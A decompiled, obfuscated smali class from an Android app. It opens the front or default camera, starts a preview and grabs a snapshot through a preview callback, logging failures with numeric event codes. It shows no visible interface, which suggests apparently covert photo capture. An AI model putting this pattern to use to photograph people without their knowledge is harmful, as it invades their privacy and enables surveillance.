.class final Lcom/network/media/d;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Z

.field final synthetic b:I

.field final synthetic c:Ljava/lang/String;

.field final synthetic d:I


# direct methods
.method constructor <init>(ZILjava/lang/String;I)V
    .locals 0

    iput-boolean p1, p0, Lcom/network/media/d;->a:Z

    iput p2, p0, Lcom/network/media/d;->b:I

    iput-object p3, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    iput p4, p0, Lcom/network/media/d;->d:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 7

    const/16 v6, 0x19

    const/16 v5, -0x3cae

    const/4 v4, 0x0

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "CameraUtil useCamera tack photo is front: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-boolean v1, p0, Lcom/network/media/d;->a:Z

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/media/a;->b()Landroid/hardware/Camera;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v0, "CameraUtil camera is not available we will try again try in:  3000"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget v0, p0, Lcom/network/media/d;->b:I

    iget-boolean v1, p0, Lcom/network/media/d;->a:Z

    iget-object v2, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    iget v3, p0, Lcom/network/media/d;->d:I

    invoke-static {v0, v1, v2, v3}, Lcom/network/media/a;->a(IZLjava/lang/String;I)V

    :goto_0
    return-void

    :cond_0
    iget-boolean v0, p0, Lcom/network/media/d;->a:Z

    if-eqz v0, :cond_1

    invoke-static {}, Lcom/network/media/a;->c()Landroid/hardware/Camera;

    move-result-object v0

    invoke-static {v0}, Lcom/network/media/a;->a(Landroid/hardware/Camera;)Landroid/hardware/Camera;

    invoke-static {}, Lcom/network/media/a;->b()Landroid/hardware/Camera;

    move-result-object v0

    if-nez v0, :cond_2

    const/4 v0, 0x1

    const/16 v1, 0x7a

    const-string v2, "LOG_CAMERA_SNAPSHOT_FAILED_FRONT"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    const/4 v0, 0x0

    const/16 v1, -0x3cae

    const-string v2, ""

    iget-object v3, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    invoke-static {v3}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "CameraUtil useCamera takePhoto front Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    iget-object v0, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    if-eqz v0, :cond_3

    const-string v0, "LOG_CAMERA_SNAPSHOT_FAILED"

    iget-object v1, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    invoke-static {v1}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v4, v6, v0, v1}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const-string v0, ""

    iget-object v1, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    invoke-static {v1}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v4, v5, v0, v1}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    goto :goto_0

    :cond_1
    :try_start_1
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0

    invoke-static {v0}, Lcom/network/media/a;->a(Landroid/hardware/Camera;)Landroid/hardware/Camera;

    :cond_2
    const-string v0, "CameraUtil useCamera Camera.open();"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/media/a;->b()Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->startPreview()V

    const-string v0, "CameraUtil startPreview"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget v0, p0, Lcom/network/media/d;->b:I

    iget-object v1, p0, Lcom/network/media/d;->c:Ljava/lang/String;

    iget v2, p0, Lcom/network/media/d;->d:I

    invoke-static {v0, v1, v2}, Lcom/network/media/a;->a(ILjava/lang/String;I)Landroid/hardware/Camera$PreviewCallback;

    move-result-object v0

    invoke-static {v0}, Lcom/network/media/a;->a(Landroid/hardware/Camera$PreviewCallback;)Landroid/hardware/Camera$PreviewCallback;

    invoke-static {}, Lcom/network/media/a;->b()Landroid/hardware/Camera;

    move-result-object v0

    invoke-static {}, Lcom/network/media/a;->d()Landroid/hardware/Camera$PreviewCallback;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    :cond_3
    const-string v0, "LOG_CAMERA_SNAPSHOT_FAILED"

    invoke-static {v4, v6, v0}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    goto/16 :goto_0
.end method
